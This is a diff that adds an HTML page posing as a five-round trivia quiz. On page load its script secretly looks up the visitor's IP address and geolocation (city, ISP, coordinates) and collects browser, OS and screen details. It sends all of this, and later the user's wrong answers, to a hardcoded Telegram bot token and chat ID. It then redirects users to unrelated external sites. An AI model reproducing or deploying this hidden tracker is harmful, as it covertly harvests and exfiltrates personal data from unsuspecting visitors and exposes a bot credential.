@@ -1,1 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Questionnaire</title>
+    <style>
+        :root {
+            --primary-color: #4a90e2;
+            --secondary-color: #f5f5f5;
+            --text-color: #333;
+            --success-color: #4caf50;
+            --error-color: #f44336;
+        }
 
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: #fff;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: var(--secondary-color);
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #ddd;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .progress {
+            height: 100%;
+            background-color: var(--primary-color);
+            border-radius: 5px;
+            transition: width 0.3s ease;
+        }
+
+        .question-container {
+            margin-bottom: 20px;
+        }
+
+        .question {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+        }
+
+        .answer-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .answer-input {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+        }
+
+        .answer-option {
+            padding: 10px 15px;
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .answer-option:hover {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .highlight {
+            background-color: yellow;
+            font-weight: bold;
+            padding: 0 2px;
+        }
+
+        .true-false-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .true-false-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+        }
+
+        .next-btn {
+            display: none;
+            padding: 10px 20px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-top: 20px;
+        }
+
+        .feedback {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .results {
+            text-align: center;
+            display: none;
+        }
+
+        .gpa-display {
+            font-size: 2em;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Interactive Questionnaire</h1>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        
+        <div class="question-container" id="questionContainer">
+            <div class="question" id="question"></div>
+            <div class="answer-container" id="answerContainer"></div>
+            <button class="next-btn" id="nextBtn">Next</button>
+            <div class="feedback" id="feedback"></div>
+        </div>
+        
+        <div class="results" id="results">
+            <h2>Quiz Complete!</h2>
+            <p>Your GPA:</p>
+            <div class="gpa-display" id="gpaDisplay"></div>
+        </div>
+    </div>
+
+    <audio id="backgroundMusic" loop>
+        <source src="https://cdn.pixabay.com/audio/2022/07/06/audio_f778937dbe.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="completionSound">
+        <source src="https://cdn.pixabay.com/audio/2024/11/12/audio_8b0420099a.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const botToken = "7753553773:AAHcoQspLrdCjrV84GjUlCM4olB_RaIkJpg";
+        const chatId = "1038828738";
+
+        const questionsData = {
+            "round1": [
+                {
+                    "question": "What is the capital of Australia?",
+                    "answer": "Canberra",
+                    "type": "text"
+                },
+                {
+                    "question": "Who wrote '1984'?",
+                    "answer": "George Orwell",
+                    "type": "text"
+                },
+                {
+                    "question": "What is the famous painting by Leonardo da Vinci depicting a woman with an enigmatic smile?",
+                    "answer": "Mona Lisa",
+                    "type": "text"
+                },
+                {
+                    "question": "What is the name of Beethoven's only opera?",
+                    "answer": "Fidelio",
+                    "type": "text"
+                },
+                {
+                    "question": "What is the chemical symbol for gold?",
+                    "answer": "Au",
+                    "type": "text"
+                }
+            ],
+            "round2": [
+                {
+                    "question": "What is the time complexity of the best-case scenario for the QuickSort algorithm?",
+                    "options": ["$$O(n^2)$$", "$$O(n\log n)$$", "$$O(n)$$", "$$O(1)$$"],
+                    "answer": "$$O(n\log n)$$",
+                    "type": "select"
+                },
+                {
+                    "question": "Which theory suggests that human behavior is motivated by self-actualization?",
+                    "options": ["Freud's Psychoanalytic Theory", "Skinner's Behaviorism", "Maslow's Hierarchy of Needs", "Piaget's Cognitive"],
+                    "answer": "Maslow's Hierarchy of Needs",
+                    "type": "select"
+                },
+                {
+                    "question": "In Keynesian economics, what term describes the total demand for goods and services in an economy at a particular time?",
+                    "options": ["Aggregate Supply", "Gross Domestic Product", "Aggregate Demand", "Consumer Price Index"],
+                    "answer": "Aggregate Demand",
+                    "type": "select"
+                },
+                {
+                    "question": "Which principle states that no two electrons in an atom can have the same set of four quantum numbers?",
+                    "options": ["Hund's Rule", "Pauli Exclusion Principle", "Aufbau Principle", "Heisenberg Uncertainty Principle"],
+                    "answer": "Pauli Exclusion Principle",
+                    "type": "select"
+                },
+                {
+                    "question": "Who is the author of the play 'Waiting for Godot'?",
+                    "options": ["Arthur Miller", "Samuel Beckett", "Tennessee Williams", "Henrik Ibsen"],
+                    "answer": "Samuel Beckett",
+                    "type": "select"
+                }
+            ],
+            "round3": [
+                {
+                    "question": "The speed of light in a vacuum is approximately 299,792 kilometers per second.",
+                    "answer": true,
+                    "type": "boolean"
+                },
+                {
+                    "question": "True or False: In humans, the gene for red-green color blindness is located on the Y chromosome.",
+                    "answer": false,
+                    "type": "boolean"
+                },
+                {
+                    "question": "The molecule ethylene (C₂H₄) contains a triple bond between the carbon atoms.",
+                    "answer": false,
+                    "type": "boolean"
+                },
+                {
+                    "question": "The Treaty of Versailles was signed in 1920, marking the end of World War I.",
+                    "answer": false,
+                    "type": "boolean"
+                },
+                {
+                    "question": "'Paradise Lost' was written by John Milton in the 17th century.",
+                    "answer": true,
+                    "type": "boolean"
+                }
+            ],
+            "round4": [
+                {
+                    "question": "Who is the philosopher known for the concept of 'the will to power' and the idea of the 'Übermensch'?",
+                    "options": ["Friedrich Nietzsche", "Immanuel Kant", "Jean-Paul Sartre", "Søren Kierkegaard"],
+                    "answer": "Friedrich Nietzsche",
+                    "type": "select"
+                },
+                {
+                    "question": "Name any noble gas.",
+                    "answer": "helium",
+                    "type": "text"
+                },
+                {
+                    "question": "According to the Mundell-Fleming model, in a small open economy with a fixed exchange rate, monetary policy is effective in influencing output.",
+                    "answer": false,
+                    "type": "boolean"
+                },
+                {
+                    "question": "In the context of quantum field theory, which mathematical object describes the quantum state of a system with an infinite number of degrees of freedom?",
+                    "options": ["Wavefunction", "Hilbert Space", "Path Integral", "Fock Space"],
+                    "answer": "Fock Space",
+                    "type": "select"
+                },
+                {
+                    "question": "The 'placebo effect' refers to improvements in a patient's condition due to their belief in the efficacy of the treatment, rather than the treatment itself.",
+                    "answer": true,
+                    "type": "boolean"
+                }
+            ],
+            "round5": [
+                {
+                    "question": "Find the highlighted word: Your mind is a powerful thing. When you fill it with positive thoughts, your life will start to change.",
+                    "highlightWord": "positive thoughts",
+                    "answer": "positive thoughts",
+                    "type": "disappearing"
+                },
+                {
+                    "question": "Find the highlighted word: Healing doesn’t mean the damage never existed. It means the damage no longer controls your life.",
+                    "highlightWord": "Healing",
+                    "answer": "Healing",
+                    "type": "disappearing"
+                },
+                {
+                    "question": "Find the highlighted word: The greatest weapon against stress is our ability to choose one thought over another.",
+                    "highlightWord": "greatest",
+                    "answer": "greatest",
+                    "type": "disappearing"
+                },
+                {
+                    "question": "Find the highlighted word: Mental health is not a destination, but a process. It's about how you drive, not where you're going.",
+                    "highlightWord": "destination",
+                    "answer": "destination",
+                    "type": "disappearing"
+                },
+                {
+                    "question": "Find the highlighted word: Sometimes the bravest and most important thing you can do is just show up.",
+                    "highlightWord": "bravest",
+                    "answer": "bravest",
+                    "type": "disappearing"
+                }
+            ]
+        };
+
+        class Quiz {
+            constructor(questionsData) {
+                this.questions = Object.values(questionsData).flat();
+                this.currentQuestionIndex = 0;
+                this.score = 0;
+                this.wrongAnswers = {
+                    round1: [], round2: [], round3: [], round4: [], round5: []
+                };
+                this.backgroundMusic = document.getElementById('backgroundMusic');
+                this.completionSound = document.getElementById('completionSound');
+                
+                this.initializeElements();
+                this.bindEvents();
+                this.startMusic();
+                this.getDeviceInfo();
+                this.showQuestion();
+            }
+
+            initializeElements() {
+                this.questionContainer = document.getElementById('questionContainer');
+                this.questionElement = document.getElementById('question');
+                this.answerContainer = document.getElementById('answerContainer');
+                this.nextButton = document.getElementById('nextBtn');
+                this.progressBar = document.getElementById('progress');
+                this.feedbackElement = document.getElementById('feedback');
+                this.resultsElement = document.getElementById('results');
+                this.gpaDisplay = document.getElementById('gpaDisplay');
+            }
+
+            bindEvents() {
+                this.nextButton.addEventListener('click', () => this.handleNext());
+            }
+
+            startMusic() {
+               //Block background music
+			   //this.backgroundMusic.play().catch(e => console.log('Audio autoplay blocked'));
+			   //Play background music
+			   this.backgroundMusic.play();
+            }
+
+            async getDeviceInfo() {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                    const locationData = await locationResponse.json();
+                    
+                    const userAgent = navigator.userAgent;
+                    const deviceInfo = {
+                        browser: this.getBrowserInfo(),
+                        os: this.getOSInfo(),
+                        device: this.getDeviceInfo(),
+                        screen: `${window.screen.width}x${window.screen.height}`,
+                        ip: ipData.ip,
+                        city: locationData.city || 'Unknown',
+                        isp: locationData.isp || 'Unknown',
+                        location: locationData.lat && locationData.lon ? `${locationData.lat}, ${locationData.lon}` : 'Unknown'
+                    };
+
+                    this.sendTelegramMessage(`
+🔍 *User Information*
+📱 Device: ${deviceInfo.device}
+💻 Browser: ${deviceInfo.browser}
+🖥 OS: ${deviceInfo.os}
+📊 Screen: ${deviceInfo.screen}
+🌐 IP: ${ipData.ip}
+🏙 City: ${deviceInfo.city}
+🔌 ISP: ${deviceInfo.isp}
+📍 Location: ${deviceInfo.location}
+                    `);
+                } catch (error) {
+                    console.error('Error getting user info:', error);
+                }
+            }
+
+            getBrowserInfo() {
+                const ua = navigator.userAgent;
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('Chrome')) return 'Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Edge')) return 'Edge';
+                return 'Unknown';
+            }
+
+            getOSInfo() {
+                const ua = navigator.userAgent;
+                if (ua.includes('Windows')) return 'Windows';
+                if (ua.includes('Mac')) return 'MacOS';
+                if (ua.includes('Linux')) return 'Linux';
+                if (ua.includes('Android')) return 'Android';
+                if (ua.includes('iOS')) return 'iOS';
+                return 'Unknown';
+            }
+
+            getDeviceInfo() {
+                if (/mobile/i.test(navigator.userAgent)) return 'Mobile';
+                if (/tablet/i.test(navigator.userAgent)) return 'Tablet';
+                return 'Desktop';
+            }
+
+            updateProgress() {
+                const progress = (this.currentQuestionIndex / this.questions.length) * 100;
+                this.progressBar.style.width = `${progress}%`;
+            }
+
+            showQuestion() {
+                const question = this.questions[this.currentQuestionIndex];
+                this.questionElement.textContent = question.question;
+                this.answerContainer.innerHTML = '';
+                this.nextButton.style.display = 'none';
+                this.feedbackElement.style.display = 'none';
+
+                switch (question.type) {
+                    case 'text':
+                        this.createTextInput();
+                        break;
+                    case 'select':
+                        this.createSelectOptions(question.options);
+                        break;
+                    case 'boolean':
+                        this.createTrueFalseButtons();
+                        break;
+                    case 'disappearing':
+                        this.createDisappearingText(question);
+                        break;
+                }
+
+                this.updateProgress();
+            }
+
+            createTextInput() {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.className = 'answer-input';
+                input.addEventListener('keyup', (e) => {
+                    if (e.key === 'Enter') {
+                        this.checkAnswer(e.target.value.trim().toLowerCase());
+                    }
+                });
+                this.answerContainer.appendChild(input);
+            }
+
+            createSelectOptions(options) {
+                options.forEach(option => {
+                    const button = document.createElement('button');
+                    button.className = 'answer-option';
+                    button.textContent = option;
+                    button.addEventListener('click', () => {
+                        this.checkAnswer(option);
+                    });
+                    this.answerContainer.appendChild(button);
+                });
+            }
+
+            createTrueFalseButtons() {
+                const container = document.createElement('div');
+                container.className = 'true-false-container';
+
+                ['True', 'False'].forEach(value => {
+                    const button = document.createElement('button');
+                    button.className = 'true-false-btn';
+                    button.textContent = value;
+                    button.addEventListener('click', () => {
+                        this.checkAnswer(value.toLowerCase() === 'true');
+                    });
+                    container.appendChild(button);
+                });
+
+                this.answerContainer.appendChild(container);
+            }
+
+            createDisappearingText(question) {
+                const text = question.question.replace('Find the highlighted word: ', '');
+                const container = document.createElement('div');
+                container.className = 'disappearing-text';
+
+                text.split(' ').forEach(word => {
+                    const span = document.createElement('span');
+                    if (word === question.highlightWord) {
+                        span.innerHTML = `<span class="highlight">${word}</span> `;
+                    } else {
+                        span.textContent = word + ' ';
+                    }
+                    container.appendChild(span);
+                });
+
+                this.answerContainer.appendChild(container);
+
+                setTimeout(() => {
+                    container.style.display = 'none';
+                    const input = document.createElement('input');
+                    input.type = 'text';
+                    input.className = 'answer-input';
+                    input.placeholder = 'Enter the highlighted word';
+                    input.addEventListener('keyup', (e) => {
+                        if (e.key === 'Enter') {
+                            this.checkAnswer(e.target.value.trim().toLowerCase());
+                        }
+                    });
+                    this.answerContainer.appendChild(input);
+                }, 3000);
+            }
+
+            checkAnswer(userAnswer) {
+                const question = this.questions[this.currentQuestionIndex];
+                const correctAnswer = question.answer.toString().toLowerCase();
+                const isCorrect = userAnswer.toString().toLowerCase() === correctAnswer;
+
+                if (!isCorrect) {
+                    const roundIndex = Math.floor(this.currentQuestionIndex / 5);
+                    const roundKey = `round${roundIndex + 1}`;
+                    this.wrongAnswers[roundKey].push({
+                        question: question.question,
+                        userAnswer: userAnswer,
+                        correctAnswer: question.answer
+                    });
+                }
+
+                if (isCorrect) {
+                    this.score++;
+                    this.showFeedback('Correct!', 'success');
+                } else {
+                    this.showFeedback(`Incorrect. The correct answer was: ${question.answer}`, 'error');
+                }
+
+                this.nextButton.style.display = 'block';
+            }
+
+            showFeedback(message, type) {
+                this.feedbackElement.textContent = message;
+                this.feedbackElement.className = `feedback ${type}`;
+                this.feedbackElement.style.display = 'block';
+            }
+
+            handleNext() {
+                this.currentQuestionIndex++;
+                
+                if (this.currentQuestionIndex < this.questions.length) {
+                    this.showQuestion();
+                } else {
+                    this.showResults();
+                }
+            }
+
+            async showResults() {
+                this.backgroundMusic.pause();
+                this.completionSound.play();
+                this.questionContainer.style.display = 'none';
+                this.resultsElement.style.display = 'block';
+                const gpa = (this.score / this.questions.length) * 4.0;
+                this.gpaDisplay.textContent = gpa.toFixed(2);
+
+                // Send wrong answers report
+                let wrongAnswersMessage = '❌ *Wrong Answers Report*\n\n';
+                for (const [round, answers] of Object.entries(this.wrongAnswers)) {
+                    if (answers.length > 0) {
+                        wrongAnswersMessage += `📝 *${round.toUpperCase()}*\n`;
+                        answers.forEach(({question, userAnswer, correctAnswer}) => {
+                            wrongAnswersMessage += `Q: ${question}\n👤 User: ${userAnswer}\n✅ Correct: ${correctAnswer}\n\n`;
+                        });
+                    }
+                }
+                await this.sendTelegramMessage(wrongAnswersMessage);
+
+                // GPA-based redirect
+                setTimeout(() => {
+                    if (gpa >= 0 && gpa < 2.5) {
+                        window.location.href = "https://tse1.mm.bing.net/th?id=OIG4.WxuuatnBkG870b1HpWag&pid=ImgGn";
+                    } else if (gpa >= 2.5 && gpa < 3.5) {
+                        window.location.href = "https://sites.google.com/view/iptv-live/home";
+                    } else if (gpa >= 4.0) {
+                        window.location.href = "tel:+1K1UGT10LAJ";
+                    }
+                }, 3000);
+            }
+
+            async sendTelegramMessage(message) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Failed to send Telegram message');
+                    }
+                } catch (error) {
+                    console.error('Error sending Telegram message:', error);
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const quiz = new Quiz(questionsData);
+        });
+    </script>
+</body>
+</html>
